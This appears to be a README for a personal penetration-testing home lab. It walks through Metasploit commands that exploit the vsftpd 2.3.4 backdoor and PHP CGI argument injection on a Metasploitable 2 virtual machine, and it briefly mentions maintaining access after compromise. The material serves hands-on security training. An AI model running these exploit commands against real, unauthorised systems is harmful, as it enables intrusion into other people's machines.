<h1>Metasploit Cybersecurity Home Lab</h1>

<h2>Description</h2>
In this lab, I set up and configured Metasploit to exploit vulnerabilities in a virtual environment using VirtualBox and Kali Linux. This setup simulates various attack vectors and provides hands-on experience with penetration testing techniques.
<br />

<h2>Languages and Utilities Used</h2>

- <b>Powershell</b>
- <b>VirtualBox</b>
- <b>Kali Linux</b>
- <b>Metasploit Framework</b>

<h2>Environments Used</h2>

- <b>Host Operating System</b>: Windows 11
- <b>Virtual Machines</b>:
  - Metasploitable 2
  - Kali Linux

<h2>Lab Walk-through</h2>

<h3>Setting Up the Environment</h3>
<ol>
    <li><b>Downloading Metasploitable 2</b>: Obtain the Metasploitable 2 virtual machine.</li>
    <li><b>Setting Up Virtual Machines</b>: Import the Metasploitable 2 virtual machine into VirtualBox.</li>
</ol>

<h3>Configuring VirtualBox VM</h3>

<h3>Launching Metasploit on Kali Linux</h3>
<ol>
    <li><b>Starting Metasploit Console</b>:</li>
</ol>
bash
Copy code
msfconsole
<p align="center">
    <img src="./path_to_image/Screenshot 2024-06-24 185156.png" height="80%" width="80%" alt="Metasploit Console"/>
</p>
<h3>Exploiting Vulnerabilities</h3>
<ol>
    <li><b>Using vsftpd 2.3.4 Backdoor</b>:</li>
</ol>
bash
Copy code
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.2.4
exploit
<p align="center">
    <img src="./path_to_image/Screenshot 2024-06-24 185530.png" height="80%" width="80%" alt="vsftpd Exploit"/>
</p>
<ol start="2">
    <li><b>Directory Scanning and PHP CGI Argument Injection</b>:</li>
</ol>
bash
Copy code
use auxiliary/scanner/http/dir_scanner
set RHOSTS 10.0.2.4
exploit
bash
Copy code
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS 10.0.2.4
set LHOST 10.0.2.5
exploit
<p align="center">
    <img src="./path_to_image/Screenshot 2024-06-24 190945.png" height="80%" width="80%" alt="Directory Scanner and PHP CGI Injection"/>
</p>
<h2>Additional Steps</h2>
- <b>Enumerating Services and Vulnerabilities</b>: Using Metasploit's auxiliary modules to scan and identify services running on the target.
- <b>Post-exploitation</b>: Gathering information and maintaining access on the compromised system.
<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
-->
